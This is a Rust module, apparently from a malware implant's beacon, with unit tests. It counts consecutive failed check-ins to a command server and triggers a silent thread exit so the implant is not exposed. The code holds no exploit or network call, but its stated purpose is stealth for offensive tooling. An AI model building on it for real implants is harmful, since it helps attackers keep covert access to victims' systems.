//! Check-in watchdog: consecutive transport failures counter. Past the
//! threshold the beacon exits silently (the server is gone or the session
//! is dead — staying alive only burns the implant). Pure, host-tested.

/// Default consecutive-failure threshold before a silent exit.
pub const DEFAULT_MAX_FAILS: u32 = 30;

/// Consecutive check-in failure counter. Any successful check-in resets
/// it; `note_fail` returns true once the threshold is reached (the caller
/// exits through `RtlExitUserThread(0)`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Watchdog {
    pub fails: u32,
    pub max_fails: u32,
}

impl Watchdog {
    #[inline]
    pub const fn new(max_fails: u32) -> Self {
        Watchdog {
            fails: 0,
            max_fails: if max_fails == 0 {
                DEFAULT_MAX_FAILS
            } else {
                max_fails
            },
        }
    }

    /// One more failed cycle; true = threshold reached, exit now.
    #[inline]
    pub fn note_fail(&mut self) -> bool {
        self.fails = self.fails.saturating_add(1);
        self.fails >= self.max_fails
    }

    /// A successful check-in resets the counter.
    #[inline]
    pub fn note_ok(&mut self) {
        self.fails = 0;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn threshold_and_reset() {
        let mut w = Watchdog::new(3);
        assert!(!w.note_fail());
        assert!(!w.note_fail());
        assert!(w.note_fail()); // 3 >= 3
        assert!(w.note_fail()); // stays over
        w.note_ok();
        assert_eq!(w.fails, 0);
        assert!(!w.note_fail());
    }

    #[test]
    fn zero_max_fails_uses_default_and_saturates() {
        let mut w = Watchdog::new(0);
        assert_eq!(w.max_fails, DEFAULT_MAX_FAILS);
        let mut i = 0;
        while i < u32::MAX {
            w.note_fail();
            i += 1;
        }
        assert_eq!(w.fails, u32::MAX); // saturating, no wrap
        assert!(w.note_fail());
    }
}
